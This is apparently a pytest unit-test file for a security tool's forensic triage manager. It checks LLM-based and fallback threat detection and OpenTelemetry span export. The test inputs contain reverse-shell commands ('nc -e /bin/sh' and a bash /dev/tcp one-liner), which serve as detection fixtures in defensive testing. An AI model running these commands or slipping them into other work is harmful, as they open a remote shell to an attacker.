"""
Unit tests for Forensic Triage Manager (`src/blackwall/enterprise/forensics/manager.py`).
Verifies dual-mode execution (Ollama Primary vs Standalone Fallback Parser) and OTel span export.
"""

import pytest
from unittest.mock import AsyncMock, patch
from blackwall.enterprise.forensics.manager import ForensicTriageManager
from blackwall.enterprise.mcp.opentelemetry_mcp import OpenTelemetryMCPAdapter


@pytest.mark.asyncio
async def test_forensic_manager_routes_to_ollama_when_online():
    otel_adapter = OpenTelemetryMCPAdapter()
    await otel_adapter.connect(verify_endpoint=False)

    manager = ForensicTriageManager(otel_adapter=otel_adapter)

    with patch.object(manager.ollama_engine, "is_ollama_online", return_value=True):
        with patch.object(
            manager.ollama_engine,
            "analyze_log_stream",
            return_value={
                "is_threat": True,
                "threat_level": "CRITICAL",
                "mode": "ollama_primary",
                "description": "Ollama LLM detected exploit",
            },
        ):
            report = await manager.triage_log_event({"command": "nc -e /bin/sh"})
            assert report["is_threat"] is True
            assert report["mode"] == "ollama_primary"
            assert report["otel_span_exported"] is True

            spans = await otel_adapter.get_active_spans()
            assert len(spans) >= 1
            assert spans[-1]["attributes"]["forensic_mode"] == "ollama_primary"


@pytest.mark.asyncio
async def test_forensic_manager_falls_back_to_lightweight_parser_when_offline():
    otel_adapter = OpenTelemetryMCPAdapter()
    await otel_adapter.connect(verify_endpoint=False)

    manager = ForensicTriageManager(otel_adapter=otel_adapter)

    with patch.object(manager.ollama_engine, "is_ollama_online", return_value=False):
        report = await manager.triage_log_event({"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"})
        assert report["is_threat"] is True
        assert report["mode"] == "standalone_fallback"
        assert report["otel_span_exported"] is True

        spans = await otel_adapter.get_active_spans()
        assert len(spans) >= 1
        assert spans[-1]["attributes"]["forensic_mode"] == "standalone_fallback"


@pytest.mark.asyncio
async def test_forensic_manager_otel_exported_flag_when_ingest_fails():
    otel_adapter = OpenTelemetryMCPAdapter()
    await otel_adapter.connect(verify_endpoint=False)

    # Force ingest_log_event to raise an exception while export_trace_span succeeds
    otel_adapter.ingest_log_event = AsyncMock(side_effect=Exception("Ingestion buffer full"))

    manager = ForensicTriageManager(otel_adapter=otel_adapter)

    with patch.object(manager.ollama_engine, "is_ollama_online", return_value=False):
        report = await manager.triage_log_event({"command": "nc -e /bin/sh"})
        assert report["is_threat"] is True
        assert report["otel_span_exported"] is True
